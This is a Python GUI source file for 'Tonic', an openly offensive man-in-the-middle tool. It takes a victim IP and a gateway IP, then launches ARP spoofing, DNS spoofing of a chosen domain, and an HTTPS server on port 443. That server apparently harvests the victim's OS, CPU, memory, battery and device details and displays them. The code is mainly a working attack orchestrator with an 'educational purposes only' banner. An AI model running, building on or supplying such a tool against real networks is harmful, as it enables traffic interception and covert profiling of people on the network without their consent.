import tkinter as tk
import threading
import queue
from tkinter import ttk,messagebox
import os
import time
import threading
from utils import is_valid_ip,get_network_config,is_ip_in_same_network,im_i_target,get_system_info,is_port_in_use
from dns_spoof import DNSSpoofer
from arp_spoof import ARPSpoofer,ExceptionMacAddress
from web_server import WEBServer
from scapy import error
import requests
import json
from datetime import datetime

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Tonic")
        self.setup_geometry()
        
        self.current_tab = tk.StringVar(value="Local Network Target")
        
        # Navbar setup
        self.navbar = ttk.Frame(self)
        self.navbar.pack(side="top", fill="x")
        
        self.content_frame = ttk.Frame(self)
        self.content_frame.pack(fill="both", expand=True)
        
        # self.create_navbar_buttons()
        # self.update_navbar()
        self.show_frame(LocalNetworkFrame)

    def setup_geometry(self):
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = screen_width // 2
        window_height = screen_height // 2
        self.geometry(f"{window_width}x{window_height}+{screen_width//4}+{screen_height//4}")

    # def create_navbar_buttons(self):
    #     self.local_network_button = ttk.Button(self.navbar, text="Local Network Target", 
    #                                            command=lambda: self.change_tab("Local Network Target", LocalNetworkFrame))
    #     self.local_network_button.pack(side="left", padx=5, pady=5)

    #     self.host_target_button = ttk.Button(self.navbar, text="Host Target", 
    #                                          command=lambda: self.change_tab("Host Target", HostTargetFrame))
    #     self.host_target_button.pack(side="left", padx=5, pady=5)

    def change_tab(self, tab_name, frame_class):
        if self.current_tab.get() != tab_name:
            self.current_tab.set(tab_name)
            self.update_navbar()
            self.show_frame(frame_class)

    def update_navbar(self):
        style = ttk.Style()
        style.configure("TButton", font=("Arial", 12), padding=10)
        style.configure("Selected.TButton", font=("Arial", 12, "bold"), background="#C8EE85")
        
        if self.current_tab.get() == "Local Network Target":
            self.local_network_button.config(style="Selected.TButton")
            self.host_target_button.config(style="TButton")
        else:
            self.local_network_button.config(style="TButton")
            self.host_target_button.config(style="Selected.TButton")

    def show_frame(self, frame_class):
        for widget in self.content_frame.winfo_children():
            widget.destroy()
        frame_class(self.content_frame).pack(fill="both", expand=True)

class LocalNetworkFrame(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.pack(fill="both", expand=True)

        self.stop_event = None 
        self.arp_thread = None 
        self.dns_thread = None 
        self.web_server_thread = None 


        # Initialize the UI elements
        self.setup_ui()

    def setup_ui(self):
        # Label "Local Network Attack" in bold, left-aligned
        label = ttk.Label(self, text="Local Network Attack", font=("Arial", 18, "bold"), anchor="w")
        label.pack(pady=10, padx=20, anchor="w")

        # Description label
        description_label = ttk.Label(self, text="Ensure that Tonic has the appropriate privilege access. Enter the target IP address and the default gateway, ensuring both are accessible and properly configured.", font=("Arial", 12), anchor="w")
        description_label.pack(pady=5, padx=20, anchor="w")

        # Target IP Address Input
        target_ip_frame = ttk.Frame(self)
        target_ip_frame.pack(pady=5, padx=20, fill="x")
        ttk.Label(target_ip_frame, text="Target IP Address:", font=("Arial", 12), width=25).pack(side="left")
        self.target_ip_entry = ttk.Entry(target_ip_frame)
        self.target_ip_entry.pack(side="left", fill="x", expand=True)

        # Default Gateway IP Address Input
        default_gtw_frame = ttk.Frame(self)
        default_gtw_frame.pack(pady=5, padx=20, fill="x")
        ttk.Label(default_gtw_frame, text="Default Gateway IP Address:", font=("Arial", 12), width=25).pack(side="left")
        self.default_gtw_entry = ttk.Entry(default_gtw_frame)
        self.default_gtw_entry.pack(side="left", fill="x", expand=True)

        # Create a frame to hold the buttons on the same line
        button_frame = ttk.Frame(self)
        button_frame.pack(pady=5, padx=20, fill="x")

        # Get Local OS Info button (aligned to the left)
        self.local_os_info_button = ttk.Button(button_frame, text="Get Local OS Info", command=self.get_local_info)
        self.local_os_info_button.pack(side="left", padx=5)

        # Create a separate frame for the right-aligned buttons
        right_button_frame = ttk.Frame(button_frame)
        right_button_frame.pack(side="right")

        # Start Attack button (aligned to the right)
        self.start_attack_button = ttk.Button(right_button_frame, text="Start Attack", command=self.start_attack)
        self.start_attack_button.pack(side="left", padx=5)

        # Stop Attack button (aligned to the right)
        self.stop_attack_button = ttk.Button(right_button_frame, text="Stop Attack", command=self.stop_attack)
        self.stop_attack_button.pack(side="left", padx=5)

        # Labels for DNS Spoofing, ARP Spoofing, Web Server (with dots)
        attack_types_frame = ttk.Frame(self)
        attack_types_frame.pack(pady=5, padx=20, anchor="w")

        # Example booleans for demonstration
        dns_spoofing_active = False
        arp_spoofing_active = False
        web_server_active = False

        # Function to add colored dot before the label
        def create_labeled_dot(label_text, is_active):
            dot_color = "green" if is_active else "red"
            dot = ttk.Label(attack_types_frame, text="•", foreground=dot_color, font=("Arial", 12))
            dot.pack(side="left")
            label = ttk.Label(attack_types_frame, text=label_text, font=("Arial", 12))
            label.pack(side="left", padx=5)
            return dot, label

        # Creating the dots and labels for each attack type
        self.dns_dot, self.dns_label = create_labeled_dot("DNS Spoofing", dns_spoofing_active)
        self.arp_dot, self.arp_label = create_labeled_dot("ARP Spoofing", arp_spoofing_active)
        self.web_dot, self.web_label = create_labeled_dot("Web Server", web_server_active)

        # Scrollable text area for logs (taking the remaining space)
        log_text_frame = ttk.Frame(self)  # Frame to hold text area and scrollbar
        log_text_frame.pack(pady=10, padx=20, fill="both", expand=True)

        # Add Scrollbar
        scrollbar = ttk.Scrollbar(log_text_frame)
        scrollbar.pack(side="right", fill="y")

        self.log_text_area = tk.Text(log_text_frame, height=10, wrap="word", state="normal", yscrollcommand=scrollbar.set)
        self.log_text_area.pack(fill="both", expand=True)

        # Link the scrollbar to the text widget
        scrollbar.config(command=self.log_text_area.yview)

        

        self.log_message_to_user('''
======================================================
                    WELCOME TO''',date=False)
        # Set the default message in the text area
        self.set_default_message()
        self.log_message_to_user('''
          The all-in-one ManInTheMiddle
======================================================''',date=False)
        self.log_message_to_user('''\n-> Designed for network analysis and remote reconnaissance. ''',date=False)

        self.log_message_to_user('''
💡 **Key Features:**
    - **Spoofing** (DNS, ARP): Intercept and redirect network traffic seamlessly.
    - **Multi-Protocol Reconnaissance**: HTTP, HTTPS, DNS and more!
                                 
🔒 **Important:**
   This tool is intended for educational purposes and authorized testing only. Misuse may result in legal consequences.

''',date=False)
        self.log_message_to_user('Start by filling necessay input and start the attack...')
        self.log_text_area.see('1.0')

        

    def set_default_message(self):
        default_text = '''.----------------------------------------------------.
|                                                    |
|                                                    |
| .-') _                     .-') _                  |
|(  OO) )                   ( OO ) )                 |
|/     '._  .-'),-----. ,--./ ,--,' ,-.-')   .-----. |
||'--...__)( OO'  .-.  '|   \ |  |\ |  |OO) '  .--./ |
|'--.  .--'/   |  | |  ||    \|  | )|  |  \ |  |('-. |
|   |  |   \_) |  |\|  ||  .     |/ |  |(_//_) |OO  )|
|   |  |     \ |  | |  ||  |\    | ,|  |_.'||  |`-'| |
|   |  |      `'  '-'  '|  | \   |(_|  |  (_'  '--'\ |
|   `--'        `-----' `--'  `--'  `--'     `-----' |
|                                                    |
|                                                    |
'----------------------------------------------------' '''
        
        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
        # self.log_text_area.insert(tk.END, default_text + "\n")  # Insert the default text
        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
        self.log_message_to_user(default_text,date=False)


    def log_message_to_user(self,message,date=True) :
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if date == True :
            finale_output = f"{current_date} ~ {message}\n"
        else :
            finale_output = f"{message}\n"

        self.log_text_area.config(state="normal")  # Temporarily make the text area editable
        self.log_text_area.insert(tk.END,finale_output )
        self.log_text_area.see(tk.END)  # Insert the default text
        self.log_text_area.config(state="disabled")

    def start_attack(self):
        def format_result(data) :
            # Parse the content
            content = json.loads(data.decode('utf-8'))

            # Organizing data into separate categories
            os_info = [
                f"Operating System: {content['os']}",
                f"CPU Cores: {content['cpu']}",
                f"Memory: {content['memory']} GB"
            ]

            # Battery info (empty in this case)
            battery_info = [
                "Battery: Empty (No data available)" if not content.get('battery') else f"Battery: {content['battery']}"
            ]

            # Devices (peripherals)
            peripherals = []
            if 'devices' in content :
                for device in content['devices']:
                    peripherals.append(f"Device Type: {device['kind']}, Label: {device['label']}, Device ID: {device['deviceId']}")

            # Log in a structured way
            # print("Operating System Info:")
            self.log_message_to_user("\n\nOperating System Info:",date=True)
            for info in os_info:
                self.log_message_to_user(f"- {info}",date=False)
                # print(f"- {info}")

            # print("\nBattery Info:")
            self.log_message_to_user("\nBattery Info:",date=False)
            for info in battery_info:
                self.log_message_to_user(f"- {info}",date=False)
                # print(f"- {info}")

            # print("\nPeripherals (Devices):")
            self.log_message_to_user("\nPeripherals (Devices):",date=False)
            if len(peripherals) != 0 :
                for device in peripherals:
                    self.log_message_to_user(f"- {device}",date=False)
                    # print(f"- {device}")  
            else :
                self.log_message_to_user(f"- No Device detected",date=False)
            self.log_message_to_user(f"\n\n",date=False)

        # Get user input
        target_ip = self.target_ip_entry.get().strip()
        default_gtw = self.default_gtw_entry.get().strip()

        # Validate that all fields are filled
        if not target_ip or not default_gtw:
            messagebox.showerror("Input Error", "All fields are required.")
            return
        
        if not is_valid_ip(target_ip):
            messagebox.showerror("Invalid Input", "Invalid target IP address format.")
            return
        if not is_valid_ip(default_gtw):
            messagebox.showerror("Invalid Input", "Invalid default gtw IP address format.")
            return
        if not is_ip_in_same_network(target_ip):
            messagebox.showerror("Invalid Default Gateway", f'The provided target IP ({target_ip}) is not on your network.')
            return
        if not is_ip_in_same_network(default_gtw):
            messagebox.showerror("Invalid Default Gateway", f'The provided default gateway IP ({default_gtw}) is not on your network.')
            return
        if default_gtw == target_ip:
            messagebox.showerror("Invalid Input", "The target IP address must be distinct from the default gateway IP address.")
            return
        if im_i_target(target_ip):
            messagebox.showerror("Invalid Input", "The target IP address is the same sa your current IP address, please change.")
            return
        
        if is_port_in_use('0.0.0.0',443):
            messagebox.showerror("Unavailible 443 port", "The webserver used for this attack requires the PORT 443 and it is currently under use, please identify and stop that program to able to start the attack.")
            return

        # ---------------------------------------------------------------------------- #
        attacker_ip , attacker_mac = get_network_config()

        # ------------------- Event to control stopping of threads ------------------- #
        self.stop_event = threading.Event()


        # ---------------------------------------------------------------------------- #
        #                              Defining Listeners                              #
        # ---------------------------------------------------------------------------- #
         # ------------------------ Defining Exception Listener ----------------------- #
        #queue to collect exception
        exception_queue = queue.Queue()

        #Exception Sniffer
        def exception_listener():
            while True:
                try:
                    # Block until an exception is available
                    exception = exception_queue.get(timeout=1)  # Use timeout to check periodically
                    
                    print("EXCEPTIOPN EHERE dsqdsqdsq5454",exception)
                    if "Permission".lower() in str(exception.__context__).lower():
                        messagebox.showerror("Permission denied", "Please run this program as root.")
                        os._exit(0)
                    
                    self.stop_attack()

                except queue.Empty:
                    pass  # No exceptions in queue; keep checking
        # ----------------------- Defining Web server Listener ----------------------- #
        #Web server Queue
        web_server_q = queue.Queue()

        #Web server Queue Sniffer
        def web_server_queue_listener():
            while True:
                try:
                    # Block until an exception is available
                    
                    message = web_server_q.get(timeout=1)  # Use timeout to check periodically
                    print("\n\n",message)
                    if message["type"] == "Alert" :
                        # Log message to text area
                        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
                        # self.log_text_area.insert(tk.END, f"{message.get('content')}\n")
                        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
                        self.log_message_to_user(f"{message.get('content')}",date=True)
                    elif message["type"] == "Result" :
                        # # Log message to text area
                        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
                        # self.log_text_area.insert(tk.END, f"{message.get('content')}\n")
                        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
                        format_result(message.get("content"))
                except queue.Empty:
                    pass  # No exceptions in queue; keep checking

        # --------------------------- Definig DNS Listener --------------------------- #
        #Web server Queue
        dns_q = queue.Queue()

        #Web server Queue Sniffer
        def dns_queue_listener():
            while True:
                try:
                    # Block until an exception is available
                    
                    message = dns_q.get(timeout=1)  # Use timeout to check periodically
                    self.log_message_to_user(f"{message}",date=True)
                    
                except queue.Empty:
                    pass  # No exceptions in queue; keep checking


        # Start the listeners threads
        listener_thread = threading.Thread(target=exception_listener, daemon=True)
        queue_web_server_thread = threading.Thread(target=web_server_queue_listener, daemon=True)
        queue_dns_thread = threading.Thread(target=dns_queue_listener, daemon=True)

        listener_thread.start()
        queue_web_server_thread.start()
        queue_dns_thread.start()
        # ---------------------------------------------------------------------------- #

        # ---------------------------------------------------------------------------- #
        #                           Defining threads starters                          #
        # ---------------------------------------------------------------------------- #

        def run_dns_spoofer(attacker_ip,target_ip,dns_q):
            try :
                dns_spoofer = DNSSpoofer(attacker_ip=attacker_ip, victim_ip=target_ip, domain="usthb",queue=dns_q)
                dns_spoofer.spoof()
            except Exception as e: 
                print("\n\n***DNS ERROR CAPTURED***")
                print(str(e.args)+" \n\n")
                exception_queue.put(e)
                

        def run_arp_spoofer(target_ip,default_gtw,attacker_mac):
            try : 
                arp_spoofer = ARPSpoofer(victim_ip=target_ip, router_ip=default_gtw, attacker_mac=attacker_mac)
                arp_spoofer.spoof()
            except ExceptionMacAddress as e :
                messagebox.showerror("Unreachable device", e)
                exception_queue.put(e)
            except Exception as e :
                print("\n\n***ARP ERROR CAPTURED***")
                print(str(e)+" \n\n")
                exception_queue.put(e)


        def run_web_server(web_server_q):
            try : 
                web_server = WEBServer(web_server_q)
                web_server.listen()
            except Exception as e: 
                print("\n\n***FLASK ERROR CAPTURED***")
                print(str(e.__context__)+" \n\n")
                exception_queue.put(e)
        # ---------------------------------------------------------------------------- #



        # Create threads
        self.dns_thread = threading.Thread(target=run_dns_spoofer,args=[attacker_ip,target_ip,dns_q])
        self.dns_dot.config(foreground="green")

        self.arp_thread = threading.Thread(target=run_arp_spoofer,args=[target_ip,default_gtw,attacker_mac])
        self.arp_dot.config(foreground="green")

        
        self.web_server_thread = threading.Thread(target=run_web_server, args=(web_server_q,))
        self.web_dot.config(foreground="green")

        self.dns_thread.start()
        self.arp_thread.start()
        self.web_server_thread.start()

        # Update the dot labels to green
        self.dns_dot.config(foreground="green")
        self.arp_dot.config(foreground="green")
        self.web_dot.config(foreground="green")

        # ---------------------------------------------------------------------------- #

        # Log message to text area
        self.log_message_to_user(f"Starting attack on {target_ip} (Gateway: {default_gtw})...",date=True)

    def get_local_info(self):
        self.log_message_to_user("Getting Current OS info...",date=True)
        self.log_message_to_user("\n\n"+get_system_info()+"\n\n",date=False)
        # messagebox.showerror("Local OS Informations", get_system_info())

    def stop_attack(self):
        print("STOPING THE ATTACK dsqdsqddsqld")
        if self.dns_thread != None or self.arp_thread != None or self.web_server_thread != None :
            
            # Stop threads by setting the stop event
            self.stop_event.set()
            self.dns_dot.config(foreground="red")
            self.arp_dot.config(foreground="red")
            self.web_dot.config(foreground="red")

            # print("dns thread",self.dns_thread)
            # print("web thread",self.web_server_thread)
            # print("arp thread",self.arp_thread)
            

            # # Wait for threads to finish
            # if self.dns_thread :
            #     self.dns_thread.join()
            self.dns_thread = None
            # if self.arp_thread:
            #     self.arp_thread.join()
            self.arp_thread = None
            # if self.web_server_thread:
            # self.web_server_thread.join()
            self.web_server_thread = None
            try : 
                url = "https://localhost:443/force_shutdown"
                requests.post(url, verify=False)
            except :
                #closing web server throws an exception
                pass
    
            # Reset the dot labels to red

            # Log message to text area
            self.log_text_area.config(state="normal")  # Temporarily make the text area editable
            self.log_text_area.insert(tk.END, f"Stopping the attack, everything back to normal...\n")
            self.log_text_area.config(state="disabled")  # Make the text area non-editable again

# class HostTargetFrame(ttk.Frame):
#     def __init__(self, parent):
#         super().__init__(parent)
        
#         label = ttk.Label(self, text="Host Target", font=("Arial", 18, "bold"), anchor="w")
#         label.pack(pady=10, padx=20, anchor="w")

#         start_scan_button = ttk.Button(self, text="Start Scan", command=self.start_scan)
#         start_scan_button.pack(pady=10, padx=20, anchor="w")

#         text_frame = ttk.Frame(self)
#         text_frame.pack(pady=10, padx=20, fill="both", expand=True)

#         scrollbar = ttk.Scrollbar(text_frame)
#         scrollbar.pack(side="right", fill="y")

#         self.scan_result_text = tk.Text(text_frame, height=10, width=50, wrap="word", state="normal", yscrollcommand=scrollbar.set)
#         self.scan_result_text.pack(fill="both", expand=True)
#         scrollbar.config(command=self.scan_result_text.yview)
#         self.scan_result_text.config(state="disabled")

#         self.progress_bar = ttk.Progressbar(self, mode="indeterminate")
#         self.set_default_message()

#     def set_default_message(self):
#         default_text = '''\n\n
# .----------------------------------------------------.
# |                                                    |
# |                                                    |
# | .-') _                     .-') _                  |
# |(  OO) )                   ( OO ) )                 |
# |/     '._  .-'),-----. ,--./ ,--,' ,-.-')   .-----. |
# ||'--...__)( OO'  .-.  '|   \ |  |\ |  |OO) '  .--./ |
# |'--.  .--'/   |  | |  ||    \|  | )|  |  \ |  |('-. |
# |   |  |   \_) |  |\|  ||  .     |/ |  |(_//_) |OO  )|
# |   |  |     \ |  | |  ||  |\    | ,|  |_.'||  |`-'| |
# |   |  |      `'  '-'  '|  | \   |(_|  |  (_'  '--'\ |
# |   `--'        `-----' `--'  `--'  `--'     `-----' |
# |                                                    |
# |                                                    |
# '----------------------------------------------------'
# \n\n'''
#         self.scan_result_text.config(state="normal")
#         self.scan_result_text.insert(tk.END, default_text + "\n")
#         self.scan_result_text.config(state="disabled")

#     def start_scan(self):
#         self.scan_result_text.config(state="normal")
#         self.scan_result_text.insert(tk.END, "Scan in progress... Please wait.\n")
#         self.scan_result_text.insert(tk.END, "⏳ Please wait...\n")
#         self.scan_result_text.config(state="disabled")

#         self.progress_bar.pack(fill="x")
#         self.progress_bar.start()

#         threading.Thread(target=self.simulate_scan, daemon=True).start()

#     def simulate_scan(self):
#         time.sleep(5)
#         self.scan_result_text.config(state="normal")
#         self.scan_result_text.insert(tk.END, "\nScan completed successfully!\nNo issues found.\n")
#         self.scan_result_text.config(state="disabled")
        
#         self.progress_bar.stop()
#         self.progress_bar.pack_forget()


if __name__ == "__main__":
    app = App()
    app.mainloop()
